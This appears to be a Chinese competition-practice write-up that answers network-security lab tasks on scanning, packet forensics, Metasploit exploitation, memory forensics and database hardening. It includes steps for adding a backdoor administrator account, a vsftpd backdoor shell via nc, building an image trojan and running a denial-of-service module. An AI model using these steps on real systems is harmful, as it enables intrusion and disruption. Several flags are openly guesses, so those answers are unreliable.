tcp.port==3306\n\n![](http://cdn.anyiblog.top/common/1649213644253-a7e6a4c9-829d-4b63-ae53-1ee0c437a693.jpg)\n追踪该流：\n\n![](http://cdn.anyiblog.top/common/1649213666331-b8cfe5b5-e4f4-4042-abdc-8a0fa197535e.jpg)\n尾部发现密码\n\nFLAG:\\[lqsym\\]\n\n6.继续查看数据包文件attack.pacapng分析出恶意用户下载了什么文件，并将文件名及后缀作为Flag值（形式：\\[文件名.后缀名\\]）提交；\n\n过滤规则ftp\n\n![](http://cdn.anyiblog.top/common/1649213667206-85d178dc-eeee-4c7d-b92f-5ee7af790119.jpg)\n追踪该流：\n\n![](http://cdn.anyiblog.top/common/1649213667800-f2d3f890-6b26-480f-ac30-f55717072314.jpg)\nFLAG:\\[flag.jpg\\]\n\n7.继续查看数据包文件attack.pacapng将恶意用户下载的文件里面的内容作为Flag值（形式：\\[文件内容\\]）提交。  \n\n过滤规则ftp-data\n\n![](http://cdn.anyiblog.top/common/1649213669148-4a9b061f-4f28-4276-bc93-5efc0a39be25.jpg)\n追踪 - 原始数据 - 保存\n\n![](http://cdn.anyiblog.top/common/1649213669719-20fbb420-8b40-4d01-b3a8-e5e9b13b9fa2.jpg)\n查看图片：\n\n![](http://cdn.anyiblog.top/common/1649213671748-c0d2b177-672d-4369-854d-e5e5ded16f28.jpg)\nFLAG:\\[harmony\\]\n\n  \n\n### B-3任务三：SSH弱口令渗透测试\n\n\\*任务说明：仅能获取Server3的IP地址\n\n1.在渗透机Kali2.0中使用Zenmap工具扫描靶机场景所在网段(例如：172.16.101.0/24)范围内存活的主机IP地址和指定开放的21、22、23端口。并将该操作使用的命令中必须要添加的字符串作为Flag值（忽略ip地址）提交；\n\nnmap -p21,22,23 172.16.101.0/24\n\nFLAG:-p 21,22,23\n\n2.通过渗透机Kali2.0对靶机场景进行系统服务及版本扫描渗透测试，并将该操作显示结果中SSH服务对应的服务端口信息作为Flag值提交；\n\nFLAG:22/tcp\n\n3.在渗透机Kali2.0中使用MSF模块对其爆破，使用search命令，并将扫描弱口令模块的名称信息作为Flag值提交；\n\n![](http://cdn.anyiblog.top/common/1649213672270-3bb3cead-463d-4807-8078-2d1c158fcc50.jpg)\nFLAG:auxiliary/scanner/ssh/ssh\\_login\n\n4.在上一题的基础上使用命令调用该模块，并查看需要配置的信息（使用show options命令），将回显中需要配置的目标地址,密码使用的猜解字典,线程,账户配置参数的字段作为Flag值（之间以英文逗号分隔，例hello,test，..,..）提交；\n\nFLAG:RHOSTS,PASS\\_FILE,THREADS,USERNAME\n\n5.在msf模块中配置目标靶机IP地址，将配置命令中的前两个单词作为Flag值提交；\n\nFLAG:set RHOSTS\n\n6.在msf模块中指定密码字典，字典路径为/root/2.txt，用户名为test爆破获取密码并将得到的密码作为Flag值提交；\n\nFLAG:aababb\n\n7.在上一题的基础上，使用第6题获取到的密码SSH到靶机，将test用户家目录中唯一一个后缀为.bmp图片的文件名的字符串作为Flag值提交。\n\n无环境  \n\n  \n\n### B-4任务四：Web安全应用（无环境）\n\n\\*任务说明：仅能获取Server4的IP地址\n\n1.通过渗透机访问靶机的HTTP服务，扫描获取HTTP服务中的任务入口地址（使用字典directories.txt），并将任务入口的URL地址作为Flag值（形式：[http://172.16.1.1/](http://172.16.1.1/)页面路径）提交；\n\n2.通过渗透机访问靶机的HTTP服务，并访问任务入口地址，分析页面内容并获得密码，将密码作为Flag值提交；\n\n3.通过渗透机访问靶机的HTTP服务，将题目2中获得的密码进行解密，由此访问新的任务入口，分析页面内容并获得密码，将密码作为Flag值提交；\n\n4.通过渗透机访问靶机的HTTP服务，将题目3中获得的密码进行解密，将解密后的密码作为Flag值提交；\n\n5.通过渗透机的火狐浏览器访问地址http://靶机IP/aredil/taherice.php，分析页面内容并获得密码，将密码作为Flag值提交；  \n\n  \n\n### B-5任务五：文件MD5校验\n\n\\*任务说明：仅能获取Server5的IP地址\n\n1.进入虚拟机操作系统：Server5中的/root目录，找到test.txt文件，并使用md5sum工具来计算出该文件的md5值，并将计算该文件md5的命令的字符串作为Flag值提交；\n\nmd5sum /root/test.txt  \n\nFLAG:md5sum test.txt\n\n2.进入虚拟机操作系统：Server5中的/root目录，找到test.txt文件，并使用md5sum校验工具来计算出该文件的md5值，并将计算该文件得到的md5值的字符串中前6位作为Flag值提交；\n\n![](http://cdn.anyiblog.top/common/1649213672627-be4aefea-7bb3-4df5-ae7f-5dc4480a76eb.jpg)\nFLAG:f447b2\n\n3.进入虚拟机操作系统：Server5中的/root目录，将test.txt文件的文件名称改为txt.txt，然后再使用md5sum工具计算txt.txt文件的md5值，并将计算该文件得到的md5值的字符串中前5位数字和之前test.txt文件md5值的字符串中前5位数字相减的结果作为Flag值提交；\n\n![](http://cdn.anyiblog.top/common/1649213680292-361dac7c-04bd-48f7-957f-91d1fd6d7946.jpg)\nFLAG:0\n\n4.进入虚拟机操作系统：Server5，使用md5sum工具来计算/etc/passwd文件的md5值，并将改md5值导入到passwd.md5文件中，并将该命令的字符串作为Flag值提交；\n\nmd5sum /etc/passwd > passwd.md5\n\n![](http://cdn.anyiblog.top/common/1649213680619-1288b5c9-8ce3-4570-b003-209e9570db64.jpg)\nFLAG:md5sum /etc/passwd > passwd.md5\n\n5.进入虚拟机操作系统：Server5，创建一个新的用户，用户名为user6，密码为123456。再次计算/etc/passwd的md5值，并将该值与passwd.md5文件中的值进行对比，并将添加用户后/etc/passwd文件的md5值的字符串中前三位数字和之前/etc/passwd文件md5值的字符串中前三位数字相减的结果作为Flag值提交。  \n\nuseradd user6 | passwd user6 | md5sum /etc/passwd | 与passwd.md5比较\n\n![](http://cdn.anyiblog.top/common/1649213681181-65ce647d-df51-4445-b45c-6cb488010b12.jpg)\n新md5值前三位为16进制猜测要逐一转换为数字 再加在一起减去2+5+2 即 40-9 = 31\n\n或 0-9 = -9\n\nFLAG:31\n\n  \n\n### B-6任务六：Windows系统安全\n\n\\*任务说明：仅能获取Server6的IP地址\n\n1.通过本地PC中渗透测试平台Kali对服务器场景Server4进行系统服务及版本扫描渗透测试，并将该操作显示结果中21端口对应的服务状态信息字符串作为Flag值提交；\n\nFLAG:open\n\n2.将首选DNS服务器地址作为Flag值提交；\n\n如果是windows7的靶机使用ms17\\_010永恒之蓝进行攻击\n\n如果是windows2003 且扫描中80端口的版本为IIS6.0 可使用CVE2017-7269进行攻击\n\n进入meterpreter后输入shell -> nslookup 或 ipconfig /all\n\n![](http://cdn.anyiblog.top/common/1649213681568-9f50e3c4-319a-44f9-b0c2-f16131a5c512.jpg)\nFLAG:192.168.31.1\n\n无环境\n\n3.找到Flag1作为Flag值提交；\n\n这边一般是查看某某目录下的某文件\n\n无环境\n\n4.找到Flag2作为Flag值提交；\n\n无环境\n\n5.将系统最高权限管理员账户的密码作为Flag值提交。\n\n需要注意的是通过CVE2017-7269打入后权限特别低 执行不了hashdump\n\n因此打通后先在meterpreter上传pr.exe 和 3389.bat （要切换到有权限的目录 如c:/111）\n\n之后用 pr.exe \"net user hacker 123456 /add\" & pr.exe \"net localgroup administrators hacker /add\"\n\n添加后门用户hacker至admin组 执行完毕后输入pr.exe \"call 3389.bat\" 开启远程端口\n\nrdesktop IP；hacker 123456远程连接\n\n之后用ms14\\_064 设置好参数后运行进行监听 得到了攻击机的恶意url\n\n在靶机中访问该url 发现ms14\\_064弹了个会话 sessions -i查看 之后sessions -1进入shell\n\nshell中即可hashdump获得用户hash值 之后用ophcrack -> load single hash -> crack即可爆出管理员密码\n\nFLAG:xcvfdsrewq4682  \n\n  \n\n### B-7任务七：渗透测试\n\n\\*任务说明：仅能获取Server7的IP地址\n\n  \n\n1.通过本地PC中渗透测试平台Kali对靶机场景Server8进行系统服务及版本扫描渗透测试，以xml格式向指定文件输出信息（使用工具Nmap），将以xml格式向指定文件输出信息必须要使用的参数作为Flag值提交；\n\nnmap -n -sV -oX target IP\n\n  \n\nFLAG:oX\n\n  \n\n2.在本地PC的渗透测试平台Kali中，使用命令初始化MSF数据库并将此命令作为Flag值提交；\n\nFLAG:msfdb init\n\n  \n\n3.在本地PC的渗透测试平台Kali中，打开MSF，使用db\\_import将扫描结果导入到数据库中，并查看导入的数据，将查看该数据要使用的命令作为Flag值提交；\n\nFLAG:db\\_import target\n\n  \n\n4.在MSF工具中用search命令搜索搜索MS17010漏洞利用模块，将回显结果中的漏洞公开时间作为flag值（如：2017-10-16）提交；\n\nsearch ms17\\_010\n\n![](http://cdn.anyiblog.top/common/1649213682453-ee2b4c2e-8e63-4287-af7b-b942e75a60cf.jpg)\nFLAG:2017-03-14\n\n  \n\n5.在MSF工具中调用MS17010漏洞攻击模块，并检测靶机是否存在漏洞，将回显结果中最后一个单词作为Flag值提交。\n\nFLAG:completed  \n\n  \n\n### B-8任务八：JS文件上传绕过\n\n\\*任务说明：仅能获取Server8的IP地址\n\n1.访问靶机网站http://靶机IP/scrg/，将文件上传页面完整URL作为Flag值（形式：[http://172.16.1.1/](http://172.16.1.1/)页面路径）提交；\n\n猜测通过dirb扫描或测试上传可能的页面\n\n无环境\n\n2.分析文件上传页面，将验证文件格式的函数名称作为Flag值提交；\n\n既然是通过JS写的页面 F12或Ctrl+U查看页面源代码 其中script里的内容即为js的内容 查找一下func 再看内容比对下即可\n\n无环境\n\n3.获取靶机FTP服务下php文件，上传php文件，将修改后的Content-Type信息作为Flag值提交；\n\n猜测文件上传页面应该是前端js对Content-Type做了白名单处理 将其修改为允许的白名单的MIME头即可\n\n无环境\n\n4.分析文件上传时的数据包，将文件上传后的路径作为Flag值（形式：[http://172.16.1.1/](http://172.16.1.1/)文件路径）提交；\n\nburp抓包repeater应该有回显路径 或 页面回显\n\n无环境\n\n5.将靶机网站服务所使用的ServerAPI值作为Flag值提交；\n\n文件上传成功后一句话木马phpinfo();即可 ServerAPI在PHPINFO的页面里查找下即可\n\n无环境\n\n6.将靶机网站服务所使用的版本号作为Flag值提交。\n\n猜测是apache服务或nginx。用nmap -sV IP 扫描 或 nikto -h IP即可\n\n无环境  \n\n  \n\n### B-9任务九：内存取证\n\n\\*任务说明：仅能获取Server9的IP地址\n\n(volatility -f <filename> imageinfo获取系统)  \n\n1.从内存文件中找到异常程序的进程，将进程的名称作为Flag值提交；\n\nvolatility -f <filename> --profile=<system> pslist 获取名称 （Name）  \n\n2.从内存文件中找到黑客将异常程序迁移后的进程编号，将迁移后的进程编号作为Flag值提交；\n\nvolatility -f <filename> --profile=<system> pslist 获取编号 （PID）  \n\n3.从内存文件中找到受害者访问的网站恶意链接，将网站的恶意链接作为Flag值提交；\n\nvolatility -f <filename> --profile=<system> iehistory 获取浏览器访问记录  \n\n4.从内存文件中找到异常程序植入到系统的开机自启痕迹，使用Volatility工具分析出异常程序在注册表中植入的开机自启项的Virtual地址，将Virtual地址作为Flag值提交；\n\nvolatility -f <filename> --profile=<system> hivelist 获取注册表记录 开启自启一般是????/run这种路径 找到对应的地址  \n\n5.从内存文件中找到异常程序植入到系统的开机自启痕迹，将启动项最后一次更新的时间作为Flag值（只提交年月日，例如：20210314）提交。  \n\nvolatility -f <filename> --profile=<system> hivedump -o <addr> 获取地址活动 将最后一次时间作为flag提交  \n\n  \n\n### B-10任务十：Linux系统安全\n\n\\*任务说明：仅能获取Server10的IP地址\n\n1.通过本地PC中渗透测试平台Kali对服务器场景Server8进行系统服务及版本扫描渗透测试，并将该操作显示结果中22端口对应的服务版本信息字符串作为Flag值提交；\n\nFLAG:OpenSSH 4.3 (protocol 2.0)\n\n2.找到/var/www目录中的图片文件，将文件名称作为Flag值提交；\n\nvsftpd笑脸漏洞：ftp ip -> usernm:root:) passwd:root:) -> nc ip 6200 -> shell\n\n无环境\n\n3.找到Flag1作为Flag值提交；\n\n无环境\n\n4.找到Flag2作为Flag值提交；\n\n无环境\n\n5.找到Flag3作为Flag值提交。\n\n无环境  \n\n  \n\n# 国赛例卷2：  \n\n### B-1任务一：主机发现与信息收集\n\n\\*任务说明：仅能获取Server1的IP地址\n\n1.通过渗透机渗透机BT5使用fping对服务器场景Server1所在网段(例如：172.16.101.0/24)进行主机发现扫描,并将该操作使用的命令中必须要使用的参数作为Flag值提交；\n\nfping -ag 172.16.101.0/24\n\nFLAG:ag\n\n2.通过渗透机渗透机Kali2.0使用genlist对服务器场景Server1所在网段进行扫描进行主机存活发现, 并将该操作使用的命令中必须要使用的参数作为Flag值提交；\n\ngenlist -s 172.16.101.\\\\\\*\n\nFLAG:s\n\n3.通过渗透机渗透机Kali2.0使用nbtscan对服务器场景Server1所在网段进搜索扫描，获取目标的MAC地址等信息，并将该操作使用的命令中必须要使用的参数作为Flag值提交；\n\nnbtscan -r 172.16.101.0/24\n\nFLAG:r\n\n4.假设服务器场景Server1设置了防火墙无法进行ping检测，通过渗透机渗透机Kali2.0使用arping检测主机连通性扫描（发送请求数据包数量为4个），并将该操作使用的命令中固定不变的字符串作为Flag值提交；\n\narping -c 4\n\nFLAG:-c 4\n\n5.通过渗透机渗透机Kali2.0使用fping对服务器场景Server1所在网段进行存活性扫描，且要把最终扫描的存活主机输出到文件ip.txt中，并将该操作使用的命令中必须要使用的参数作为Flag值（各参数之间用英文逗号分割，例a,b）提交；\n\nfping -ag 172.16.101.0/24 >ip.txt\n\nFLAG:ag,>ip.txt\n\n6.通过渗透机渗透机Kali2.0使用nbtscan从第5题的ip.txt文件中读取IP扫描主机信息MAC地址等信息，并将该操作使用的命令中固定不变的字符串作为Flag值提交；\n\nnbtscan -f ip.txt\n\nFLAG:f\n\n7.通过渗透机渗透机Kali2.0使用xprobe2对服务器场景Server1进行TCP扫描，仅扫描靶机80,3306端口的开放情况(端口之间以英文格式下逗号分隔)，并将该操作使用的命令中固定不变的字符串作为Flag值提交；\n\nxprobe2 -T 80,3306 172.16.101.0\n\nFLAG:-T 80,3306\n\n8.通过渗透机渗透机Kali2.0使用xprobe2对服务器场景Server1进行UDP扫描，仅扫描靶机161,162端口的开放情况(端口之间以英文格式下逗号分隔)，并将该操作使用的命令中固定不变的字符串作为Flag值提交。\n\nxprobe2 -U 161,162 172.16.101.0\n\nFLAG:-U 161,162\n\n  \n\n### B-2任务二：Windows系统安全（国赛例卷4 B-4）\n\n\\*任务说明：仅能获取Server6的IP地址\n\n  \n\n1.通过本地PC中渗透测试平台Kali对服务器场景Server6进行系统服务及版本扫描渗透测试，并将该操作显示结果中21端口对应的服务状态信息字符串作为Flag值提交；\n\n  \n\n2.将首选DNS服务器地址作为Flag值提交；\n\n  \n\n3.找到Flag1作为Flag值提交；\n\n  \n\n4.找到Flag2作为Flag值提交；\n\n  \n\n5.将系统最高权限管理员账户的密码作为Flag值提交。\n\n  \n\n### B-3任务三：Web信息收集\n\n\\*任务说明：仅能获取Server3的IP地址\n\n1.通过Kali对靶机场景进行Web扫描渗透测试（使用工具nikto，查看该命令的完整帮助文件），并将该操作使用命令中固定不变的字符串作为Flag值提交；\n\nnikto -host [http://test.com/](http://test.com/)\n\n  \n\nFLAG:-host或-h\n\n2.通过Kali对靶机场景进行Web扫描渗透测试（使用工具nikto，扫描目标服务器8080端口，检测其开放状态），并将该操作使用命令中固定不变的字符串作为Flag值（目标地址以[http://10.10.10.1](http://10.10.10.1/)来表示）提交；\n\nFLAG:\\-host [http://10.10.10.1](http://10.10.10.1/) -port 8080\n\n3.通过Kali对靶机场景进行Web扫描渗透测试（使用工具nikto，扫描目标服务器80端口），将回显信息中apache服务的版本参数作为Flag值提交；\n\nnikto -host [http://10.10.10.1](http://10.10.10.1/) -port 80\n\n![](http://cdn.anyiblog.top/common/1649213684736-f1b06f62-35eb-427f-93ae-4bdea0e3e24b.jpg)\nFLAG:Apache/2.2.15\n\n4.通过Kali对靶机场景进行Web扫描渗透测试（使用工具nikto，扫描目标服务器80端口），将回显信息中php的版本参数作为Flag值提交；\n\n![](http://cdn.anyiblog.top/common/1649213686315-66c62392-6c98-4fd9-afb2-4be94b357bfa.jpg)\nFLAG:PHP/5.3.3\n\n5.通过Kali对服务器场景Linux进行Web扫描渗透测试（使用工具nikto，扫描CGI-BIN目录的文件），将该操作使用的命令中固定不变的字符串作为Flag值（目标地址以：[http://10.10.10.1](http://10.10.10.1/)来表示）提交；\n\nFLAG:-host [http://10.10.10.1/CGI-BIN](http://10.10.10.1/CGI-BIN)\n\n6.通过Kali对靶机场景进行Web扫描渗透测试，使用工具nikto并结合Nmap的扫描结果进行扫描，首先使用Nmap工具对靶机所在网段的80端口进行扫描，并将扫描结果以输出至所有格式的方式输出到指定文件target中，将输出至所有格式需要用到的参数作为Flag值提交；\n\nnmap -p80 10.140.98.0/24 -oG target\n\nFLAG:oG\n\n7.通过Kali对靶机场景进行Web扫描渗透测试，使用工具nikto扫描第六题生成的target文件中的网站，并将该操作使用的所有命令作为Flag值提交。  \n\nFLAG:nikto -host target\n\n  \n\n### B-4任务四：数据分析数字取证\n\n\\*任务说明：仅能获取Server4的IP地址\n\n1.使用Wireshark查看并分析Server4桌面下的logs.pcapng数据包文件，通过分析数据包attack.pcapng找出恶意用户目录扫描的第9个文件，并将该文件名作为Flag值（形式：\\[robots.txt\\]）提交；\n\nhttp规则过滤：\n\n![](http://cdn.anyiblog.top/common/1649213687026-dec695a9-5527-4f14-924d-f6cc9db2d23c.jpg)\n第九个文件：\n\n![](http://cdn.anyiblog.top/common/1649213687928-89db3f8a-89ba-4f16-9071-db5fef7244c6.jpg)\nFLAG:\\[star.php\\]\n\n2.继续查看数据包文件logs.pacapng，分析出恶意用户扫描了哪些端口，并将全部的端口作为Flag值（形式：\\[端口名1，端口名2，端口名3…，端口名n\\]）从低到高提交；\n\n过滤规则tcp.connection.syn and ip.addr==172.16.1.10\n\n![](http://cdn.anyiblog.top/common/1649213688950-968da198-da74-46b2-85c5-3bfaaf29cd7a.jpg)\nFLAG:\\[21,80,445,1433,3306,3389,5000\\]\n\n3.继续查看数据包文件logs.pacapng分析出恶意用户读取服务器的文件名是什么，并将该文件名作为Flag值（形式：\\[robots.txt\\]）提交；\n\nhttp规则过滤 翻找一下除去404 not found的页面：\n\n![](http://cdn.anyiblog.top/common/1649213690278-36912986-a34b-40b7-a9bc-03842f3de5ec.jpg)\nFLAG:\\[name.txt\\]\n\n4.继续查看数据包文件logs.pacapng分析出恶意用户写入一句话木马的路径是什么，并将该路径作为Flag值（形式：\\[/root/whoami/\\]）提交；\n\n继续找：\n\n![](http://cdn.anyiblog.top/common/1649213691305-569eb85e-d875-46cb-8a37-b7e85743530f.jpg)\nFLAG:\\[C:/phpstudy/www/\\]\n\n5.继续查看数据包文件logs.pacapng分析出恶意用户连接一句话木马的密码是什么，并将一句话密码作为Flag值（形式：\\[一句话密码\\]）提交；\n\n![](http://cdn.anyiblog.top/common/1649213692859-1f1a402a-be90-48e3-8b68-ebd4ed1c8eda.jpg)\nFLAG:007\n\n6.继续查看数据包文件logs.pacapng分析出恶意用户下载了什么文件，并将文件名及后缀作为Flag值（形式：\\[文件名.后缀名\\]）提交；\n\n在http为POST请求包里找\n\n![](http://cdn.anyiblog.top/common/1649213693686-5ae5b0e2-f809-42e2-9e67-5448680a2d2e.jpg)\nFLAG:\\[flag.zip\\]\n\n7.继续查看数据包文件logs.pacapng将恶意用户下载的文件里面的内容作为Flag值（形式：\\[文件内容\\]）提交。\n\n追踪该流：\n\n![](http://cdn.anyiblog.top/common/1649213694843-2f362434-376d-4965-96e3-f8cee55a2221.jpg)\n内容：\n\n![](http://cdn.anyiblog.top/common/1649213710807-09599a93-ac70-440b-af94-366c699b7c10.jpg)\nflag.zip里的文件为flag.txt 内容为flag{Find You!}\n\nFLAG:\\[flag{Find You!}\\]\n\n  \n\n### B-5任务五：本地文件包含\n\n\\*任务说明：仅能获取Server5的IP地址\n\n1.扫描靶机服务器，将靶机网站服务的服务版本作为Flag值提交；\n\nnikto -h IP\n\n猜测FLAG:2.2.15\n\n无环境\n\n2.在靶机FTP服务中，存在密码文件，使用密码文件暴力破解网站密码，将破解后的密码作为Flag值提交；\n\n猜测是字典 使用burp进行爆破即可\n\n猜测FLAG:admin123\n\n无环境\n\n3.使用base64加密，将加密后的字符串作为Flag值提交；\n\nkali下echo xxxx | base64 -e\n\n无环境\n\n4.使用cat命令制作图片木马，新图片名称为backdoor.png，将制作图片木马的完整命令作为Flag值提交；\n\n猜测FLAG:cat test.png shell.php > backdoor.png\n\n5.进入靶机网站http://靶机IP/lfi/，在靶机网站中上传backdoor.png文件，在页面上运行上传的图片文件，将完整URL作为Flag值（形式：[http://172.16.1.1/](http://172.16.1.1/)页面路径）提交；\n\n猜测FLAG:http://172.16.1.1/lfi/uploadedfile/backdoor.png\n\n无环境\n\n6.获取靶机C:\\\\flag.txt文件内容作为Flag值提交。  \n\n蚁剑或菜刀连接图片马 至根目录下查看即可\n\n无环境\n\n  \n\n### B-6任务六：数据库安全加固\n\n\\*任务说明：仅能获取Server6的IP地址\n\n1.进入虚拟机操作系统：CentOS 6.8，登陆数据库（用户名：root；密码：root），查看数据库版本号，将查看数据库版本号的命令作为Flag值提交；\n\nFLAG:select version();\n\n2.进入虚拟机操作系统：CentOS 6.8，登陆数据库（用户名：root；密码：root），查看数据库版本号，将查询到的数据库版本号作为Flag值提交；\n\n![](http://cdn.anyiblog.top/common/1649213711157-1288273d-52d2-4616-9275-18c2690ad3c2.jpg)\nFLAG:10.5.8-MariaDB-3\n\n3.进入虚拟机操作系统：CentOS 6.8，登陆数据库（用户名：root；密码：root），查看数据库列表，将查看数据库列表的命令作为Flag值提交；\n\nFLAG:show databases;\n\n4.进入虚拟机操作系统：CentOS 6.8，登陆数据库（用户名：root；密码：root），进入MySQL数据库，查看所有用户及权限，找到可以从任意 IP 地址访问的用户，将该用户的用户名作为Flag值提交；（如有多个可以从任意 IP 地址访问的用户，提交形式为用户名|用户名|用户名|用户名）\n\npayload：select user from mysql.user where host='%';（本地只有localhost）\n\n![](http://cdn.anyiblog.top/common/1649213711530-1e05bfb3-bc01-4930-8883-55d67d349f39.jpg)\n  \n\n无环境\n\n5.进入虚拟机操作系统：CentOS 6.8，登陆数据库（用户名：root；密码：root），进入MySQL数据库，查看所有用户及权限，找到可以从任意 IP 地址访问的用户，使用drop命令将该用户删除，将操作命令作为Flag值提交；\n\nFLAG:drop user 'test'@'%';\n\n![](http://cdn.anyiblog.top/common/1649213711862-68bf8dd3-2d29-49c4-bd05-10b55f649261.jpg)\n6.进入虚拟机操作系统：CentOS 6.8，登陆数据库（用户名：root；密码：root），进入MySQL数据库，改变默认 MySQL 管理员的名称，将系统的默认管理员root 改为 admin，防止被列举，将操作命令作为Flag值提交。  \n\nFLAG:update mysql.user set user='admin' where user='root';\n\n  \n\n### B-7任务九：操作系统应急响应（无环境）\n\n\\*任务说明：仅能获取Server7的IP地址\n\n1.将黑客成功登录系统所使用的IP地址作为Flag值提交；\n\n2.黑客成功登录系统后修改了登录用户的用户名，将修改后的用户名作为Flag值提交；\n\n3.黑客成功登录系统后成功访问了一个关键位置的文件，将该文件名作为Flag值提交；\n\n4.黑客对数据库进行了暴力破解，将最后一次暴力破解的时间作为Flag值提交；\n\n5.黑客在系统中隐藏了某个批处理文件，将该文件内容作为Flag值提交。  \n\n  \n\n### B-8任务八：MS15034漏洞扫描与利用\n\n\\*任务说明：仅能获取Server8的IP地址\n\n1.在MSF工具中用search命令搜索MS15034HTTP.SYS漏洞拒绝服务攻击模块，将回显结果中的漏洞披露时间作为Flag值（如：2015-10-16）提交；\n\nsearch ms15\\_034\n\n![](http://cdn.anyiblog.top/common/1649213712475-b5488279-3a21-479c-ad54-22269bea8760.jpg)\nFLAG:2015-04-14\n\n2.在MSF工具中调用MS15034HTTP.SYS漏洞的辅助扫描模块，将调用此模块的命令作为Flag值提交；\n\nFLAG:use auxiliary/scanner/http/ms15\\_034\\_http\\_sys\\_memory\\_dump\n\n3.使用set命令设置目标IP，并检测漏洞是否存在，运行此模块，将回显结果中倒数第2行的最后一个单词作为Flag值提交；\n\nset rhosts IP\n\ncheck\n\nrun\n\n![](http://cdn.anyiblog.top/common/1649213713470-43d731d8-0166-45a2-a93d-fcd2714b6f74.jpg)\nFLAG:complete\n\n4.在MSF工具中调用并运行MS15034HTTP.SYS漏洞的拒绝服务攻击模块，将运行此模块后回显结果中倒数第1行的最后一个单词作为Flag值提交；\n\nuse auxiliary/dos/http/ms15\\_034\\_ulonglongadd > set rhosts IP > run\n\n![](http://cdn.anyiblog.top/common/1649213714036-9a09ae3d-bfe1-4d0c-81b0-a8beb5c6d723.jpg)\nFLAG:completed\n\n5.进入靶机在IIS网站下的编辑输出缓存设置中禁止启用内核缓存，再次运行MS15034HTTP.SYS漏洞的拒绝服务攻击模块，运行此模块并将回显结果中倒数第2行的最后一个单词作为Flag值提交。\n\n![](http://cdn.anyiblog.top/common/1649213714430-5c1e5c9d-b194-412c-9c4a-15d7b21f4581.jpg)\nFLAG:complete\n\n  \n\n### B-9任务十：Web渗透测试\n\n\\*任务说明：仅能获取Server9的IP地址\n\n1.通过渗透机访问靶机HTTP服务，尝试上传或获取Web服务应用程序对应的木马类型，将木马应在位置（绝对目录）不变的部分作为Flag值提交；\n\n上传后页面应该有回显url 或burp抓包到repeater发送看有无回显url\n\n猜测FLAG:uploadedfile/\n\n无环境\n\n2.通过渗透机渗透靶机HTTP服务，将漏洞利用过程中对文件名修改的最关键部分字符串作为Flag提交；\n\n应该是前端对后缀名进行判断 将后缀改为php\n\n猜测FLAG:php\n\n无环境\n\n3.通过渗透机渗透靶机HTTP服务，将靶机的完整OS版本作为Flag值提交；\n\nnmap -O -n IP\n\nOS Detail:xxx\n\n猜测FLAG:xxx\n\n无环境\n\n4.通过渗透机渗透靶机HTTP服务，下载靶机Web根目录下无后缀名的文件，并将文件名作为Flag值提交；\n\n猜测通过一句话木马RCE查看根目录下无后缀名的文件\n\n猜测FLAG:passwd\n\n无环境\n\n5.分析并找到文件中的密码值，并将密码值作为Flag值提交；\n\n一句话木马cat一下即可\n\n猜测FLAG:xxx\n\n无环境\n\n6.将密码值解密后的明文作为Flag值提交。\n\n猜测MD5或用户哈希 用john 或 hashcat跑一下\n\n猜测FLAG:12345678\n\n无环境  \n\n  \n\n  \n\n### B-10任务九：PE Reverse（国赛例卷6 B-8）\n\n\\*任务说明：仅能获取Server10的IP地址\n\n1.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，将main函数的入口地址作为Flag值提交；\n\n2.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，将该二进制文件中检查许可证的关键函数作为Flag值提交；\n\n3.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，找到Flag1值并提交；\n\n4.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，尝试破解该二进制文件，将注册成功后的回显信息作为Flag值提交；\n\n5.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，将该激活所需的许可证码作为Flag值提交；  \n\n###   \n\n  \n\n# 国赛例卷3：\n\n### B-1任务一：主机发现与信息收集\n\n1.在Kali中使用Nmap工具查看本地路由与接口,并将该操作使用的全部命令作为Flag值提交；\n\nFLAG:nmap --iflist\n\n2.通过Kali对靶机场景进行VNC服务扫描渗透测试，并将使用的脚本名称作为Flag值（如：MySQL-brute.nse）提交；\n\nls /usr/share/nmap/scripts | grep vnc 该目录是所有插件 利用grep查找\n\n![](http://cdn.anyiblog.top/common/1649213714782-b2fca908-944e-4ddc-b49a-74e542577c14.jpg)\nFLAG:vnc-brute\n\n3.通过Kali对靶机场景进行VNC服务扫描渗透测试，并将该操作显示结果中VNC版本号作为Flag值提交；\n\nnmap --script vnc-brute.nse -sV 10.140.98.227\n\n![](http://cdn.anyiblog.top/common/1649213715376-1dbd7b02-39b5-49b7-b6f0-6a19d5ef9438.jpg)\nFLAG:VNC (protocol 3.8)\n\n4.在Kali中使用Nmap发送空的UDP数据对类DNS服务avahi进行拒绝服务攻击，并将使用的脚本名称作为Flag值（如：MySQL-brute.nse）提交；\n\nls /usr/share/nmap/scripts | grep avahi\n\n![](http://cdn.anyiblog.top/common/1649213715720-ee01cd29-974f-409e-8933-627a397dee37.jpg)\nFLAG:broadcast-avahi-dos.nse\n\n5.通过Kali对靶机场景进行模糊测试，来发送异常的包到靶机服务器，探测出隐藏在服务器中的漏洞 ，并将使用的脚本名称作为Flag值（如：MySQL-brute.nse）提交；\n\ndns-fuzz.nse\n\n6.在Kali中使用Zenmap工具扫描服务器场景可能存在存在远程任意代码执行漏洞，并将使用的脚本名称的字符串作为Flag值（如：MySQL-brute.nse）提交；\n\nhttp-shellshock.nse\n\n7.在Kali中使用Zenmap工具扫描服务器场景可能存在远程任意代码执行漏洞（提示：检测路径为/cgi-bin/bin，需添加\\--script-args uri=/cgi-bin/bin参数），并将该操作显示结果中漏洞编号和发布时间作为Flag值（漏洞编号和发布时间的字符串之间以分号隔开）提交。\n\nCVE-2014-7169;2014-09-24\n\n  \n\n### B-2任务二：渗透测试\n\n\\*任务说明：仅能获取Server2的IP地址\n\n1.在MSF工具中用search命令搜索MS12020 RDP拒绝服务攻击模块，将回显结果中的漏洞披露时间作为Flag值（如：2012-10-16）提交；\n\n![](http://cdn.anyiblog.top/common/1649213716395-36a41910-57fc-4040-8d7a-4a9217e0182f.jpg)\nFLAG:2012-03-16\n\n2.在MSF工具中调用MS12020 RDP拒绝服务漏洞的辅助扫描模块，将调用此模块的命令作为Flag值提交；\n\nuse auxiliary/scanner/rdp/ms12\\_020\\_check\n\n3.使用set命令设置目标IP，并检测靶机是否存在漏洞，运行此模块，将回显结果中倒数第2行的最后一个单词作为Flag值提交；\n\n![](http://cdn.anyiblog.top/common/1649213717628-ce88ac7d-565e-406a-9263-10d94a05b564.jpg)\nFLAG:completed\n\n4.在MSF工具中调用并运行MS12020 